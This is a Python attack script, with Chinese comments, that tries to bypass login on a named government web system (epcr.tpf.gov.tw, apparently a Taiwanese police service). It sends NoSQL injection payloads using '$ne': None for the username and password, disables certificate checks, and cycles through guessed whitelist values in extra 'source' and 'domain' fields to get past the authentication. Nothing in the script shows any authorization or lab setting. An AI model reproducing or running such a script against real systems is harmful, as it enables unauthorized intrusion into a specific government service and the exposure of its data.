import requests, urllib3, time, json
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login_full(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code, r.text[:80]

# 白名单候选值 (前端 whiteListedDomains + 常见)
wl=["localhost","epcr.tpf.gov.tw","118.163.107.93","35.234.50.28",
    "AUTH_SERVER","PORTAL","WEB","API","ADMIN","SYSTEM","TPF","EP.CR"]

print("=== 尝试: $or 让 username 匹配 OR source 字段命中白名单 ===")
# 假设后端 source 校验是: user.source in WHITELIST
# 若能注入 source 字段使其为白名单值 -> 绕过
for sv in wl[:6]:
    # 注入: username $ne (匹配全部) + 额外 source 条件
    body={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    # 尝试在请求里加 source 字段 (虽非标准参数, 但JQLike可能透传)
    body["source"]=sv
    sc,tx=login_full(body); time.sleep(0.05)
    print(f"  source={sv:22s} -> {sc} {tx}")

print("\n=== 尝试: 直接注入 $where 检查 source (若source在白名单则返回真) ===")
# $where: this.source 无法在username字段用. 改测 domain 参数是否映射 source
for dv in ["AUTH_SERVER","localhost","epcr.tpf.gov.tw"]:
    body={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":dv}
    sc,tx=login_full(body); time.sleep(0.05)
    print(f"  domain={dv:22s} -> {sc} {tx}")
